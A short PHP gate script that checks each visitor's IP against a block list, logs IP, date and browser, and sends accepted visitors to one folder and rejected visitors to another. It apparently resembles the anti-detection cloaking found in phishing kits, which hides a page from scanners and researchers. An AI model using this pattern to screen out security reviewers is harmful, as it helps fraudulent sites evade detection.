<?php

# Check if the requester is authorized to request this resource directly

if(!defined('authorized')) {

   header('Location: .');
   die();
   
}

# Start a session and include the visitor log variables

session_start();

require "includes/log_variables.php";

# Perform an IP range check on the visitor, log the result, generate a new temporary folder, populate it with the page files, and redirect to it

$ips = array(	$_SERVER['REMOTE_ADDR'],
				 );

$checklist = new IpBlockList( );

foreach ($ips as $ip) {

	$result = $checklist->ipPass($ip);

	if ($result) {
		
        $fp = fopen("logs/accepted_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);
	
      if (!isset($_SESSION['page_a_visited'])) {
		
        $_SESSION['page_a_visited'] = true;
		
        header("Location: data/");
	   
	  }
	  
	}
	
	else {
		
		$fp = fopen("logs/denied_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);
        header("Location: content/");
		
	}
	
}

?>